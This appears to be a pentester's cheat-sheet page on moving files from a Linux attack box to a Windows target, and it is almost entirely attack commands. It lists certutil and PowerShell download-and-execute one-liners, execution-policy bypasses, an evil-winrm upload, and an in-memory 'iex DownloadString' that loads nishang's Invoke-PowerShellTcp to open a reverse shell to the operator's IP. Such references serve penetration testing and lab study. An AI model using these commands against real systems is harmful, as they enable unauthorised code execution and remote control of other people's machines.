---
title: "File Transfer (Linux to Windows)"
date: 2024-6-26
tags: ["file transfer", "Windows", "evil-winrm"]
---

{{< tab set1 tab1 active >}}CMD{{< /tab >}}
{{< tab set1 tab2 >}}Powershell{{< /tab >}}
{{< tab set1 tab3 >}}evil-winrm{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Start a Local HTTP Server

<div>

```console
python3 -m http.server <LOCAL_PORT>
```

</div>

<br>

<div>

```console
certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE>
```

```console
# Upload and Run
certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE> && C:\ProgramData\<FILE>
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### Start a Local HTTP Server

<div>

```console
python3 -m http.server <LOCAL_PORT>
```

</div>

<br>

<div>

```console
# Long version
Invoke-WebRequest http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -OutFile C:\ProgramData\<FILE>
```

```console
# Short version
iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>
```

<small>*Note: PowerShell 3.0+*</small>

</div>

<div>

```console
# Long version
powershell.exe -ExecutionPolicy bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>
```

```console
# Short version
powershell -ep bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE>
```

<small>*Note: curl is not always available*</small>

</div>

<div>

```console
# Load into memory and Run
```

```console
# Long version
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT>
```

```console
# Short version
iex (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/rev.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT>
```

```console
# Combined version
iex (iwr http://<LOCAL_IP>:<LOCAL_PORT>/rev.ps1)
```

<small>*Ref: [rev.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)*</small>

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

<div>

```console
# Evil-winrm built-in function
upload '<LOCAL_FILE_PATH>' "C:\ProgramData\<FILE>"
```

</div>

{{< /tabcontent >}}

<br>